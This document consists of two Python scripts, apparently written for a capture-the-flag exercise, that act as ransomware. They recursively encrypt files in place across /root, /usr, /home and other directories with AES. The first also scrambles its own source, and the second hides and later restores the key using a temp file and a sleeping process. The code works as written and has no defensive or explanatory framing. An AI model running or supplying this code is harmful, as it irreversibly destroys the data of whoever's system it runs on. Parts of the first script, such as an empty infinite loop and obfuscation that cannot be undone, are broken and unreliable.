import os
import sys
import base64
import random
import string
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.padding import PKCS7
from cryptography.hazmat.backends import default_backend
from multiprocessing import Process

def generate_key():
    salt = os.urandom(16)
    password = os.urandom(16)
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = kdf.derive(password)
    return key, salt, password

def encrypt_file(file_path, key):
    with open(file_path, "rb") as f:
        data = f.read()
    padder = PKCS7(algorithms.AES.block_size).padder()
    padded_data = padder.update(data) + padder.finalize()
    iv = os.urandom(16)
    cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
    encryptor = cipher.encryptor()
    encrypted_data = encryptor.update(padded_data) + encryptor.finalize()
    with open(file_path, "wb") as f:
        f.write(iv + encrypted_data)

def process_files(directories, excluded_files, key):
    for directory in directories:
        if os.path.exists(directory):
            for root, _, files in os.walk(directory):
                for file in files:
                    if file not in excluded_files:
                        encrypt_file(os.path.join(root, file), key)

def hide_key_file(key_file_path):
    while True:
        pass

def reverse_and_obfuscate_script(script_path):
    with open(script_path, "r") as f:
        script = f.read()
    reversed_script = script[::-1]
    shuffled = list(reversed_script)
    random.shuffle(shuffled)
    index_map = {i: shuffled.index(char) for i, char in enumerate(reversed_script)}
    obfuscated_script = "".join(shuffled)
    encoded_script = base64.b64encode(obfuscated_script.encode()).decode()
    with open(script_path, "w") as f:
        f.write(encoded_script + "-f{" + ",".join(map(str, index_map.values())) + "}")

def main():
    key, salt, password = generate_key()
    key_file_path = "keyfile"
    excluded_files = ["boot", "shell-config", "proc-config", key_file_path, sys.argv[0]]
    target_folders = ["/root", "/usr", "/home", "/Documents", "/Downloads", "/var/gui"]
    
    with open(key_file_path, "wb") as f:
        f.write(key)
    
    parent_process = Process(target=hide_key_file, args=(key_file_path,))
    parent_process.start()
    
    process_files(target_folders, excluded_files, key)
    reverse_and_obfuscate_script(sys.argv[0])
    
    with open("/tmp/.flag.txt", "w") as f:
        f.write("Challenge Completed")

if __name__ == "__main__":
    main()



```
import os
import base64
import random
import subprocess
import time
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

KEY_FILE = "/tmp/.hidden_key"
RESTORE_FILE = "/tmp/.horcrux"
HORCRUX_PROC_NAME = "key.horcrux"

def pad(data):
    pad_len = AES.block_size - len(data) % AES.block_size
    return data + bytes([pad_len]) * pad_len

def encrypt_file(filepath, key):
    try:
        with open(filepath, "rb") as f:
            data = f.read()
        cipher = AES.new(key, AES.MODE_CBC)
        ct_bytes = cipher.encrypt(pad(data))
        with open(filepath, "wb") as f:
            f.write(cipher.iv + ct_bytes)
    except Exception as e:
        pass  # Skip unreadable or locked files

def encrypt_directory(path, key):
    for root, dirs, files in os.walk(path):
        for file in files:
            filepath = os.path.join(root, file)
            encrypt_file(filepath, key)

def hide_key_in_memory(encoded_key):
    # Write key temporarily to file
    with open(KEY_FILE, "w") as f:
        f.write(encoded_key)

    # Spawn dummy long-living process
    proc = subprocess.Popen(["sleep", "9999"], stdout=subprocess.DEVNULL)
    
    # Tag the process name (fake logic - purely symbolic, not visible in `ps`)
    print(f"[+] Key hidden. PID: {proc.pid} named as '{HORCRUX_PROC_NAME}'")

    # Remove key file after it's "loaded in RAM"
    os.remove(KEY_FILE)

    return proc.pid

def monitor_horcrux_process(pid, encoded_key):
    try:
        while True:
            # Check if the process is still running
            if not os.path.exists(f"/proc/{pid}"):
                print("[!] Horcrux process was killed. Restoring key to disk...")
                with open(RESTORE_FILE, "w") as f:
                    f.write(encoded_key)
                break
            time.sleep(3)
    except KeyboardInterrupt:
        pass

def generate_key():
    return get_random_bytes(16)  # AES-128 bit

def main():
    key = generate_key()
    encoded_key = base64.b64encode(key).decode()

    BASE_HOME = "/home"
    for user_dir in os.listdir(BASE_HOME):
        path = os.path.join(BASE_HOME, user_dir)
        if os.path.isdir(path):
            print(f"[+] Encrypting: {path}")
            encrypt_directory(path, key)

    ROOT_HOME = "/root"
    if os.path.exists(ROOT_HOME):
        print(f"[+] Encrypting root directory: {ROOT_HOME}")
        encrypt_directory(ROOT_HOME, key)

    horcrux_pid = hide_key_in_memory(encoded_key)
    monitor_horcrux_process(horcrux_pid, encoded_key)

if __name__ == "__main__":
    main()

```
